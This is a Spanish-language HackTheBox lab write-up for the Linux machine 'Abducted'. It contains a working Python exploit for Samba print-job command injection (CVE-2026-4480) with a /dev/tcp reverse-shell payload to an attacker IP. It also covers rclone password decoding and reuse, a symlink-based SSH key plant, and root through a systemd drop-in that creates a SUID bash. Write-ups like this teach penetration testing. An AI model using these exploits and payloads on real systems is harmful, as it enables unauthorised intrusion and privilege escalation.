# Writeup - Abducted (HackTheBox)

**Máquina:** Abducted  
**Plataforma:** HackTheBox  
**Sistema:** Linux (Ubuntu 24.04)  
**IP:** 10.129.244.177  
**Objetivo:** Obtener User.txt y Root.txt

## Sinopsis

Abducted es una máquina Linux construida alrededor del servidor de archivos e impresión local de una firma de servicios profesionales. La cadena de explotación incluye:

1. Inyección de comandos en el subsistema de impresión de Samba (CVE-2026-4480) para acceso inicial
2. Recuperación de credenciales ofuscadas de `rclone` para acceder como `scott` por SSH
3. Abuso de `force user` + `wide links` de Samba para convertirse en `marcus`
4. Escalada de privilegios mediante un drop-in de systemd delegado por polkit a root

---

## Enumeración

### Escaneo Nmap

```
$ nmap -p- --open -Pn -n -T4 10.129.244.177 -oG quick.txt
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  netbios-ssn

$ nmap -p 22,139,445 -sCV -Pn 10.129.244.177

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

### Recursos Compartidos SMB

```
$ smbclient -L //10.129.244.177 -N

Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

El recurso compartido de impresora `HP-Reception` permite impresión como invitado. Los recursos `projects` y `transfer` requieren autenticación.

También podemos obtener información del sistema mediante `rpcclient`:

```
$ rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
10.129.244.177 Wk Sv PrQ Unx NT SNT Hartley Group Document Services
    platform_id : 500
    os version : 6.1
    server type : 0x809a03
```

---

## Acceso Inicial - CVE-2026-4480 Inyección de Comandos en Impresión Samba

### Análisis de Vulnerabilidad

CVE-2026-4480 es una inyección de comandos en el subsistema de impresión de Samba. Cuando un trabajo de impresión finaliza, Samba ejecuta el `print command` configurado a través de `system()`, sustituyendo `%J` con el nombre del trabajo proporcionado por el cliente (document name) sin sanitización. El único filtrado era reemplazar `'` por `_`, dejando `|`, `;`, espacios y otros metacaracteres intactos.

El objetivo usa `printing = sysv` con `print command = /usr/local/bin/printaudit %J %s`.

### Exploit

Un trabajo de impresión a través de la interfaz RPC spoolss nos permite establecer un `document_name` arbitrario (que se convierte en `%J`) y el contenido del archivo spool (`%s`). Con `document_name = "|sh"`, el comando ejecutado se convierte en:

```
/usr/local/bin/printaudit |sh <spoolfile>
```

El cuerpo del archivo spool se ejecuta como un script de shell.

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "10.129.244.177", "10.10.14.55", 4444
DATA = ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n" % (LHOST, LPORT)).encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()
iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)
h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)

i1 = spoolss.DocumentInfo1(); i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h); iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)
```

```
$ nc -lvnp 4444
$ python3 exploit.py
[+] job submitted
connect to [10.10.14.55] from (UNKNOWN) [10.129.244.177]
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

---

## Movimiento Lateral: nobody → scott

### Recuperando la Contraseña de rclone

Una configuración de backup externo es legible mundialmente:

```
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

`rclone` ofusca las contraseñas con codificación base64 reversible. El texto plano se recupera usando `rclone reveal`:

```
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

### SSH como scott

La contraseña descodificada se reutiliza para la cuenta `scott`:

```
$ ssh scott@10.129.244.177
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
scott@abducted:~$ cat user.txt
<REDACTED>
```

---

## Movimiento Lateral: scott → marcus

### Configuración de Samba

Leemos los archivos de configuración de Samba:

```
scott@abducted:~$ cat /etc/samba/shares.conf
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes

scott@abducted:~$ grep -E 'unix extensions|wide links' /etc/samba/smb.conf
unix extensions = no
allow insecure wide links = yes
```

El recurso `transfer` está configurado con `force user = marcus` y `wide links = yes`. La configuración global deshabilita las extensiones Unix y permite wide links inseguros.

### Explotando wide links + force user

El directorio `/srv/transfer` es propiedad de `scott`, por lo que se puede crear un enlace simbólico al home de marcus. Con `wide links = yes`, Samba sigue el enlace fuera del recurso compartido, y debido a `force user = marcus`, los archivos escritos a través del recurso son propiedad de marcus:

```
scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh
scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

Ahora podemos acceder como marcus por SSH:

```
$ ssh -i marcus_key marcus@10.129.244.177
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

---

## Escalada de Privilegios: marcus → root

### Análisis de Polkit

`marcus` pertenece al grupo `operators`. La acción de recarga del daemon de systemd está autorizada para este grupo sin contraseña:

```
marcus@abducted:~$ pkcheck --action-id org.freedesktop.systemd1.reload-daemon --process $$
exit: 0
```

### Directorio de Drop-in de systemd

El directorio `smbd.service.d` tiene permisos de escritura para el grupo `operators`:

```
marcus@abducted:~$ ls -la /etc/systemd/system/smbd.service.d/
drwxrws---  2 root operators 4096 ... .
```

### Cadena de Explotación

1. Escribir un drop-in de systemd que cree un bash SUID al iniciar el servicio:

```
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

2. Recargar el daemon de systemd (autorizado vía polkit) y reiniciar `smbd`:

```
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

3. Las directivas `ExecStartPre` se ejecutan como root durante el inicio del servicio, dejando un bash SUID:

```
marcus@abducted:~$ ls -la /tmp/.rb
-rwsr-xr-x 1 root root 1446024 ... /tmp/.rb
```

4. Ejecutar el bash SUID para obtener root:

```
marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
<REDACTED>
```

---

## Flags

| Flag | Valor |
|------|-------|
| User | `<REDACTED>` |
| Root | `<REDACTED>` |

## Resumen

| Paso | Técnica | Vulnerabilidad |
|------|---------|----------------|
| 1 | Inyección de comandos en nombre de trabajo de impresión vía spoolss RPC | CVE-2026-4480 |
| 2 | Decodificar contraseña ofuscada de `rclone` | Credencial reutilizada |
| 3 | Enlace simbólico + `force user` + `wide links` de SMB | Mala configuración |
| 4 | polkit + drop-in de servicio systemd | Escalada de privilegios |
